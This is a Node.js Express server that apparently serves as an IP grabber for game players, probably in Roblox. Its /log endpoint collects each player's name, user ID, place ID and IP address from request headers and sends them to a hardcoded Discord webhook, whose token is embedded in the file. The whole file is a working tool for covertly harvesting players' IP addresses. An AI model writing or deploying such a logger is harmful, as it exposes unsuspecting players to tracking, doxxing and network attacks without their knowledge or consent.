const express = require('express');
const https = require('https');
const app = express();

// YOUR WEBHOOK
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1469544408444567766/3PcIRNOpYQ8bsYJECwwDXK6H24Aoe6VpidxaURUv6ThwVkke3IgcnKdZPDIenEBKbMgi';

function postToDiscord(playerData) {
    const payload = JSON.stringify({
        embeds: [{
            title: '🕵️ Player Logged',
            fields: [
                { name: '👤 Name', value: playerData.playerName || 'Unknown', inline: true },
                { name: '🆔 ID', value: playerData.userId || 'Unknown', inline: true },
                { name: '🌐 IP', value: `\`${playerData.ipAddress}\``, inline: true },
                { name: '📍 Place', value: playerData.placeId || 'N/A', inline: true }
            ],
            color: 16711680,
            timestamp: new Date().toISOString()
        }]
    });
    
    const req = https.request(WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    }, (res) => {
        console.log('✅ Discord OK:', res.statusCode);
    });
    
    req.on('error', (e) => {
        console.log('⚠️ Discord failed:', e.message);
    });
    
    req.write(payload);
    req.end();
}

app.get('/log', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.ip || 'Unknown';
    
    const data = {
        playerName: req.query.playerName || 'Unknown',
        userId: req.query.userId || 'Unknown',
        placeId: req.query.placeId || 'Unknown',
        ipAddress: ip.split(',')[0]
    };
    
    console.log(`🎮 ${data.playerName} | ${data.ipAddress}`);
    
    // SAFE DISCORD SEND
    try {
        postToDiscord(data);
    } catch (e) {
        console.log('Discord error:', e.message);
    }
    
    res.json({ ok: true, ip: data.ipAddress });
});

app.get('/health', (req, res) => {
    res.json({ status: 'OK', time: new Date().toISOString() });
});

app.listen(process.env.PORT || 3000, () => {
    console.log('🚀 Logger started');
});
